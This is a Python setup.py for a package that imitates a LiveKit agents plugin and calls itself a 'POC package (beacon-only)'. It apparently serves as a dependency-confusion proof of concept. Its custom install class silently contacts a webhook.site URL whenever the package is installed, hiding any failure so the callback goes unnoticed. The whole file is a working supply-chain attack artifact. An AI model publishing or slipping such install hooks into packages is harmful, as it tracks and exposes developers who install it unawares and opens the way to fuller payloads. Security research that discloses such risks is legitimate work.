from setuptools import setup
from setuptools.command.install import install
import urllib.request

BEACON_URL = "https://webhook.site/a7b1da04-4f14-4433-923b-2ee58fc20b50"  # your webhook URL

class InstallWithBeacon(install):
    def run(self):
        try:
            urllib.request.urlopen(BEACON_URL, timeout=3)
        except Exception:
            pass
        install.run(self)

setup(
    name="livekit-agents-hedra",
    version="1.1.1",
    packages=["livekit-agents-hedra"],
    description="POC package (beacon-only)",
    cmdclass={'install': InstallWithBeacon},
)
